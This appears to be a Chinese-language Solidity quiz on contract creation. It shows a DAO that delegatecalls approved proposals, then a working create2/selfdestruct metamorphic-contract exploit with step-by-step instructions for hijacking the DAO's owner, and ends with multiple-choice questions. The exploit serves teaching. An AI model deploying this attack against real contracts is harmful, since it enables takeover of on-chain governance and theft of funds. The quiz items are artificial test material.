# quiz4

合约创建方式

## Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");
        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");
        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(abi.encodeWithSignature("executeProposal()"));
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}
```

## 上面的DAO合约是否安全？存在什么问题？

## Code
```solidity
contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
```

## 上面的合约是否可以攻击Dao合约？如何实现？
```
Called by Alice
0. Deploy DAO

Called by Attacker
1. Deploy DeployerDeployer
2. Call DeployerDeployer.deploy()
3. Call Deployer.deployProposal()

Called by Alice
4. Get DAO approval of Proposal

Called by Attacker
5. Delete Proposal and Deployer
6. Re-deploy Deployer
7. Call Deployer.deployAttack()
8. Call DAO.execute
9. Check DAO.owner is attacker's address

DAO -- approved --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Attack
```

## 以下说法正确的有哪些？
* 合约地址除了由创建合约交易的sender和nonce生成外，还可以通过create2加salt来生成
* 由于create2创建的合约地址是sender,salt,code计算的，与nonce无关，所以可以在同一个地址部署合约多次，只要交易的sender,创建合约的salt和合约code一样就可以，因为这些决定了新合约的地址
* 如果通过create2创建合约B，合约B创建合约C，之后通过create2重新创建合约B，合约B可以部署新合约C，合约C地址相同，但Code可以不一样
* 合约可以通过交易删除
